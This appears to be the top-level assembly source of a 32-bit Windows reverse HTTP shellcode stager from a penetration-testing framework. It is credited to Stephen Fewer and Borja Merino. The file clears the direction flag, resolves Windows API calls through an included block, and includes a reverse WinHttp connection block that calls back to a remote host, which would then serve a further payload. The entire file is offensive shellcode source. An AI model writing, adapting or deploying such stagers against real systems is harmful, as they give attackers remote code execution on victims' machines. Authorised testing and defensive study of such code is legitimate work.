;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
;         Borja Merino (bmerinofe[at]gmail.com). [WinHttp stager (Http)]
; Version: 1.0 (January 2015)
; Size: 323 bytes
; Build: >build.py stager_reverse_winhttp_http
;-----------------------------------------------------------------------------;

[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; pop off the address of 'api_call' for calling later.
%include "./src/block/block_reverse_winhttp.asm"
  ; By here we will have performed the reverse_tcp connection and EDI will be our socket.

